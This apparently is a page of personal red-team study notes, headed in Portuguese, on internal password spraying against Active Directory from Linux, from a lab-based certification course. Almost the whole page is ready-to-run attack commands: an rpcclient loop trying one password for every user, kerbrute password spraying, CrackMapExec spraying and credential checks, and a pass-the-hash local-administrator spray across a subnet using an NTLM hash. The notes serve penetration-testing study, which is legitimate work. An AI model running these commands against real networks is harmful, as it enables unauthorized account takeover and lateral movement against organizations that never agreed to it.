> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/active-directory-enumeration-and-attacks/internal-password-spraying-from-linux.md).

# Internal Password Spraying - from Linux

* **Usando uma linha Bash para o ataque**

```sh
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

* **Usando Kerbrute para o Ataque**

```sh
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```

* **Usando CrackMapExec e filtrando falhas de logon**

```sh
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

* **Validando as credenciais com CrackMapExec**

```sh
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

* **Administração local pulverizando com CrackMapExec**

```sh
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
